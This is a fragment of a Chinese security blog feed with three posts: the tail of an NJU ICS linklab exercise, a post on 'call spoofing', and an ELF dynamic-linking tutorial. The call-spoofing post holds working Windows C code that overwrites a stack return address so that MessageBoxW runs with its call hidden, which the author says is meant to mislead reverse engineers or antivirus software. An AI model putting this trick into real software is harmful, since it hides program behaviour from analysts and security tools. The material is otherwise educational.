class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">00000119</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">0000005</span>c  <span class="number">00001902</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.ax</span><br><span class="line"><span class="number">0000011f</span>  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">00000067</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000083</span>  <span class="number">00000509</span> R_386_GOTOFF      <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000133</span>  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000000</span>c  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000b</span>b  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000061</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000f</span>3  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000113</span>  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000092</span>  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>a8  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">000000</span>cf  <span class="number">00001</span>d2b R_386_GOT32X      <span class="number">00000020</span>   yAnKQn</span><br><span class="line"><span class="number">00000141</span>  <span class="number">00001f</span>04 R_386_PLT32       <span class="number">00000058</span>   transform_code</span><br><span class="line"><span class="number">0000014</span>c  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br><span class="line"><span class="number">0000016</span>c  <span class="number">00002102</span> R_386_PC32        <span class="number">00000000</span>   __x86.get_pc_thunk.bx</span><br><span class="line"><span class="number">00000172</span>  <span class="number">00001</span>a0a R_386_GOTPC       <span class="number">00000000</span>   _GLOBAL_OFFSET_TABLE_</span><br><span class="line"><span class="number">0000017</span>d  <span class="number">00002404</span> R_386_PLT32       <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">000001</span>a0  <span class="number">0000222b</span> R_386_GOT32X      <span class="number">00000080</span>   AycPNh</span><br><span class="line"><span class="number">000001</span>aa  <span class="number">00001e2</span>b R_386_GOT32X      <span class="number">000000</span>ac   aQSEth</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase6.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">a*aTTgg-K</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>调用欺骗拾遗</title>
      <link href="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/"/>
      <url>/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/</url>
      
        <content type="html"><![CDATA[<h1 id="调用欺骗拾遗"><a href="#调用欺骗拾遗" class="headerlink" title="调用欺骗拾遗"></a>调用欺骗拾遗</h1><p><a href="https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/">https://grxer.github.io/2023/05/04/ELF%20Dynamical-link/</a> 中显示的运行时链接那段代码让我想起了之前在lnnks老师那里，看到一个比较有意思的code</p><p>环境vs2022  x86 Release版</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    show(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show函数利用栈溢出把返回地址所处地址ar[3]改为pf指针指的函数(push参数后call嘛)，只改返回地址pf函数不能正常返回main的，所以我们把pf的返回地址ar[3]处改为了原来show的返回地址，弹出messagebox后正常返回main函数，但是main在ret的时候会crash掉</p><p><img src="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/image-20230506154546803.png" alt="image-20230506154546803"></p><p>为什么呢?</p><p>由于messagebox函数是winapi，Windows API默认的函数调用协议__stdcall，所以最后以一条ret 10h的指令来内平栈，show函数是C&#x2F;C++默认的函数调用协议_cdecl,在调用返回main后会用 add   esp,14h进行外平栈，所以我们比原来的普通show函数调用多了一个ret 10h，ret10h等效于 pop eip；add esp，10h ，所以我们比原来多平了20字节的栈</p><p>最简单的一种方法，是在调用show之前用内联汇编压5次栈，或者我们去分配5个四字节的局部变量，去填充一块栈空间</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">     push <span class="number">666</span> </span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     push <span class="number">666</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//int ar[5]=&#123;0&#125;;</span></span><br><span class="line">    show(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决了栈的问题但不完美,我们这样做调用的目的是隐藏掉调用痕迹去迷惑逆向分析的人也好或者杀软也好</p><p>push完5个参数后，show函数也要push，谁家好人push十个参数啊，一眼顶真了</p><p>我们调用show返回main时由于一些非法操作导致栈其实已经平了，add会导致栈不平，我们可以控制返回地址干嘛不直接跳过这条add指令呢</p><p><img src="/2023/05/05/%E8%B0%83%E7%94%A8%E6%AC%BA%E9%AA%97%E6%8B%BE%E9%81%97/image-20230506152018853.png" alt="image-20230506152018853"></p><p>直接ar[4]+&#x3D;3;</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    (show)(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show函数是cdecl的外平栈，我们可以把他强转为stacall在调用时来抹除这个外平栈，相当于我show函数编译成的代码是外平栈的，但是我们在调用时把他当作内平栈的stdcall，欺骗编译器不给我们平栈</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> optimize(<span class="string">&quot;&quot;</span>,off)</span></span><br><span class="line"><span class="type">void</span>  <span class="title function_">show</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="comment">//ar[2]:ebp;ar[3] ret; jar[4] void *pf;</span></span><br><span class="line">    <span class="type">int</span> ar[<span class="number">2</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">3</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">    ar[<span class="number">4</span>] = ar[<span class="number">3</span>] ^ ar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(_stdcall* pf)</span><span class="params">(<span class="type">void</span>* pf, HWND hWnd,</span></span><br><span class="line"><span class="params">    LPCTSTR lpText,</span></span><br><span class="line"><span class="params">    LPCTSTR lpCaption,</span></span><br><span class="line"><span class="params">    UINT uType</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    ((pf)show)(MessageBoxW, <span class="number">0</span>, TEXT(<span class="string">&quot;grxer&quot;</span>), TEXT(<span class="string">&quot;grxer&quot;</span>), MB_OK);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;hello&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF动态链接(ELF Dynamical link)</title>
      <link href="/2023/05/04/ELF-Dynamical-link/"/>
      <url>/2023/05/04/ELF-Dynamical-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Dynamical-link"><a href="#ELF-Dynamical-link" class="headerlink" title="ELF Dynamical link"></a>ELF Dynamical link</h1><p>对于静态链接的缺点</p><ul><li><p>对于一些可以共用的库，每个程序在磁盘上都有一份代码副本，加载到内存也是这样，造成了空间的浪费</p></li><li><p>静态链接的程序更新起来麻烦，需要重新编译并发送给用户</p></li></ul><h2 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h2><p>思路:把程序分为不同的模块，不再是在编译时进行链接，在程序运行时再链接，这个工作由动态链接器来完成</p><blockquote><p>这里说的不在编译时做链接，其实还是有一个整合的过程的，比如说我们在主程序里调用了printf，如果按照静态编译的话就是把静态库libc.a里的printf.o模块和主程序模块合并，并做重定位工作，动态链接的话其实也会把printf符号信息从动态库里放到主程序模块，但是不做重定位，重定位是留到运行时去做，可以理解为动态链接库给了主程序一个借条，运行时找动态链接库去要，hh</p></blockquote><p>一些共用的模块逐渐就形成了动态链接库.so</p><p>so，程序&#x3D;主模块+动态链接库</p><p>我们把动态链接库映射到内存一次，其他程序再加载时需要用到动态链接库，就不用再从磁盘加载一份了，直接建个页目录映射到这一块内存</p><h2 id="地址无关"><a href="#地址无关" class="headerlink" title="地址无关"></a>地址无关</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -share -o xx.so x.c 可以生成动态链接库</span><br></pre></td></tr></table></figure><h3 id="share"><a href="#share" class="headerlink" title="-share"></a>-share</h3><p>-share时指示生成动态链接库</p><p>动态链接要去把不同的共享模块做映射，映射到的虚拟地址空间是随机的这个要求我们共享模块是地址无关的，就是不管映射到哪里都可以执行</p><blockquote><p>这让我想起，之前说开了pie保护的程序的elf heade里的e_type为什么是ET_DYN共享目标文件，而不是ET_EXEC可执行文件的原因</p><p><a href="https://grxer.github.io/2023/03/19/23-2-21-elf/">https://grxer.github.io/2023/03/19/23-2-21-elf/</a></p><p>因为开了pie地址我们程序映射的虚拟地址要随机化，就要求我们的可执行程序也是地址无关的，合情合理</p></blockquote><p>地址无关，一种方法是借鉴我们静态链接时方法，就是把链接搬到了运行时模块地址确定后，遍历重定位表去给绝对引用做重定位，因为要去修改指令所以没有办法做到多进程共享代码，这也是只加-share不加-fpic 时使用的重定位方法</p><h3 id="fPIC"><a href="#fPIC" class="headerlink" title="-fPIC"></a>-fPIC</h3><p>-fPIC指示生成位置无关代码(Postive Independent Code, PIC)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> a;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> b;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">ext</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span>&#123;</span><br><span class="line">    a=<span class="number">1</span>;</span><br><span class="line">    b=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    ext();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; gcc -m32 -fPIC -shared -o xxx.so test.c</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; file xxx.so</span><br><span class="line">xxx.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=9a4e584b71c83ff881f77f68b5483d63929ca339, not stripped</span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; checksec xxx.so</span><br><span class="line">[*] &#x27;/mnt/hgfs/share/link-load-library-code/chapter7/xxx.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="gt-gt-gt-模块内的过程调用和跳转"><a href="#gt-gt-gt-模块内的过程调用和跳转" class="headerlink" title="&gt;&gt;&gt; 模块内的过程调用和跳转"></a><strong>&gt;&gt;&gt; 模块内的过程调用和跳转</strong></h4><p>foo里调用bar()</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">000003f0 &lt;bar@plt&gt;:</span><br><span class="line">3f0:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)</span><br><span class="line">3f6:   68 00 00 00 00          push   $0x0</span><br><span class="line">3fb:   e9 e0 ff ff ff          jmp    3e0 &lt;_init+0x30&gt;</span><br><span class="line">00000576 &lt;foo&gt;:</span><br><span class="line">588:   e8 63 fe ff ff          call   3f0 &lt;bar@plt&gt;</span><br><span class="line">58d:   e8 6e fe ff ff          call   400 &lt;ext@plt&gt;</span><br><span class="line">592:   90                      nop</span><br></pre></td></tr></table></figure><p>模块内指令与指令之间的距离不变，直接按不变的相对地址来寻址就可以地址无关， 0x58d-0x19d(fffffe63)&#x3D;0x3f0，这里直接用了plt表，先把他理解为就是那个函数地址吧，plt表后面再说</p><blockquote><p>模块内原本可以不采用plt表和got表，直接利用偏移就可以做到地址无关，采用plt和got表是为了防止多个模块中全局符号(模块内的函数，全局变量等)出现重复定义的情况</p><p>在动态链接过程中是按最先在某个模块里发现的符号来的，万一是原本对本模块里的符号引用被其他模块里的符号绑定到了，那就是模块间的关系，只能利用got表来做PIC</p></blockquote><h4 id="gt-gt-gt-模块内数据访问"><a href="#gt-gt-gt-模块内数据访问" class="headerlink" title="&gt;&gt;&gt;模块内数据访问"></a><strong>&gt;&gt;&gt;模块内数据访问</strong></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">550</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line"> <span class="number">551</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line"> <span class="number">553</span>:   e8 <span class="number">41</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">599</span> &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> <span class="number">558</span>:   <span class="number">05</span> a8 <span class="number">1</span>a <span class="number">00</span> <span class="number">00</span>          add    $<span class="number">0x1aa8</span>,%eax</span><br><span class="line">   a=<span class="number">1</span>;</span><br><span class="line"> <span class="number">55</span>d:   c7 <span class="number">80</span> <span class="number">1</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span>    movl   $<span class="number">0x1</span>,<span class="number">0x1c</span>(%eax)</span><br><span class="line"> <span class="number">564</span>:   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure><p>指令段和数据段之间的距离是固定的，知道指令地址就可以找到模块内数据</p><p>指令地址使用这个<code> 553:   e8 41 00 00 00      call   599 &lt;__x86.get_pc_thunk.ax&gt;</code>来获取的，这也是一个一个模块内调用的例子，0x558+0x41&#x3D;0x599</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000599</span> &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line"> <span class="number">599</span>:   <span class="number">8b</span> <span class="number">04</span> <span class="number">24</span>                mov    (%esp),%eax</span><br><span class="line"> <span class="number">59</span>c:   c3                      ret</span><br></pre></td></tr></table></figure><p>call会把下一条指令地址压栈，就是0x558，然后把0x558赋值给eax，指令地址就保存到了eax</p><p><code>add    $0x1aa8,%eax</code>，然后eax&#x3D;0x1aa8+0x558&#x3D;0x2000</p><p><code> 55d:   c7 80 1c 00 00 00 01    movl   $0x1,0x1c(%eax)</code></p><p>0x2000再加上0x1c 0x201c是什么呢?</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">readelf -S  xxx.so</span><br><span class="line">There are <span class="number">33</span> section headers, starting at offset <span class="number">0x1964</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[<span class="number">23</span>] .bss              NOBITS          <span class="number">00002018</span> <span class="number">001018</span> <span class="number">000008</span> <span class="number">00</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -s  xxx.so</span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">67</span> entries:</span><br><span class="line">Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line"><span class="number">40</span>: <span class="number">0000201</span>c     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">23</span> a</span><br></pre></td></tr></table></figure><p>正好是在未初始化的全局变量和局部静态变量的.bss段的a，也符合我们在静态链接时的分析</p><h4 id="gt-gt-gt-模块间数据访问"><a href="#gt-gt-gt-模块间数据访问" class="headerlink" title="&gt;&gt;&gt;模块间数据访问"></a><strong>&gt;&gt;&gt;模块间数据访问</strong></h4><p><strong>敲黑板了</strong>，模块间才是重点，这个时候相对地址已经不存在了，而是在数据段的开始处设立了一个叫做全局偏移量表(Global Offset Table, GOT)的指针数组(pwn手最爱哈哈)</p><p>汇编器为GOT中的每一个项生成一个重定位项，类似于我们静态链接的数据段的重定位表.rel.data,动态链接里叫做.rel.dyn用来修正数据引用，两种表数据结构一样</p><p>动态链接器在把引用数据所在模块的加载地址确定后，把正确地址写入他的got，就完成了重定位，同时由于这个数据段是进程私有的，也就实现了内存里的代码段可以多个进程共享</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -S  xxx.so</span><br><span class="line">There are 33 section headers, starting at offset 0x1964:</span><br><span class="line">Section Headers:</span><br><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[20] .got              PROGBITS        00001fe8 000fe8 000018 04  WA  0   0  4</span><br><span class="line"></span><br><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -r  xxx.so</span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x358 contains 9 entries:</span><br><span class="line">Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00001fec  00000206 R_386_GLOB_DAT    00000000   b</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void bar()&#123;</span><br><span class="line"> 550:   55                      push   %ebp</span><br><span class="line"> 551:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 553:   e8 41 00 00 00          call   599 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line"> 558:   05 a8 1a 00 00          add    $0x1aa8,%eax</span><br><span class="line">    a=1;</span><br><span class="line"> 55d:   c7 80 1c 00 00 00 01    movl   $0x1,0x1c(%eax)</span><br><span class="line"> 564:   00 00 00</span><br><span class="line">    b=2;</span><br><span class="line"> 567:   8b 80 ec ff ff ff       mov    -0x14(%eax),%eax</span><br><span class="line"> 56d:   c7 00 02 00 00 00       movl   $0x2,(%eax)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是利用固定偏移找到got表，eax在前面已经算过是0x2000，再-0x14正好是0x1FEC 正好对应b的got表的位置，往它里面的指针写入值就行了</p><blockquote><p>关于获取pc值，我在资料上还看到一种直接call下一条指令的方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000357:e8 00 00 00 00    call 00035c</span><br><span class="line">00035c:5b                 popl %ebx</span><br></pre></td></tr></table></figure><p>比call getpc的函数少了ret，速度和空间都有提升</p><p>64位程序都是采用rip直接加偏移,32位程序不知道为什么不直接用eip寄存器里的值加偏移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001139 &lt;bar&gt;:</span><br><span class="line">    1139:       f3 0f 1e fa             endbr64</span><br><span class="line">    113d:       55                      push   %rbp</span><br><span class="line">    113e:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1141:       c7 05 e9 2e 00 00 01    movl   $0x1,0x2ee9(%rip)        # 4034 &lt;a&gt;</span><br><span class="line">    1148:       00 00 00</span><br><span class="line">    114b:       48 8b 05 86 2e 00 00    mov    0x2e86(%rip),%rax        # 3fd8 &lt;b&gt;</span><br><span class="line">    1152:       c7 00 02 00 00 00       movl   $0x2,(%rax)</span><br><span class="line">    1158:       90                      nop</span><br><span class="line">    1159:       5d                      pop    %rbp</span><br><span class="line">    115a:       c3                      ret</span><br></pre></td></tr></table></figure></blockquote><h4 id="gt-gt-gt-模块间过程调用和跳转"><a href="#gt-gt-gt-模块间过程调用和跳转" class="headerlink" title="&gt;&gt;&gt;模块间过程调用和跳转"></a><strong>&gt;&gt;&gt;模块间过程调用和跳转</strong></h4><p>对于模块间的调用等，也可以往got表里写入函数地址，就像上面一样，ELF把got分为了.got和.got.plt。 其中.got用来保存全局变量引用的地址，.got.plt用来保存函数引用的地址</p><p>类似于我们静态链接的代码段的重定位表.rel.text，动态链接里.rel.plt对函数引用的修正，两种表数据结构一样</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">[21] .got.plt          PROGBITS        00002000 001000 000014 04  WA  0   0  4</span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x3c0 contains 2 entries:</span><br><span class="line">Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">00002010  00000507 R_386_JUMP_SLOT   00000000   ext</span><br></pre></td></tr></table></figure><p>但是在实现的过程中每次程序启动时动态链接器都要对got表做修正，但是被修正的大量函数我们程序使用的只是一小部分，就出现了延迟绑定(lazy binding)的方法，在程序用到时在进行动态链接修正got，是借助过程链接表(Procedure Linkage Table, PLT）[代码段]和got[数据段]配合来实现的</p><p>got.plt前三项是特殊值</p><ul><li>第一项是.dynamic段的装载地址</li><li>第二项是动态链接的标识信息 link_map的地址</li><li>第三项是动态链接器的做动态链接的函数入口 _dl_runtime_resolve</li></ul><h3 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h3><blockquote><p>.dynamic段保存了动态链接器所需要的基本信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword    d_tag;<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;            <span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;            <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/04/ELF-Dynamical-link/image-20230506083401085.png" alt="image-20230506083401085"></p><p>地址是在文件里的偏移</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/l/chapter7&gt; readelf -d  xxx.so</span><br><span 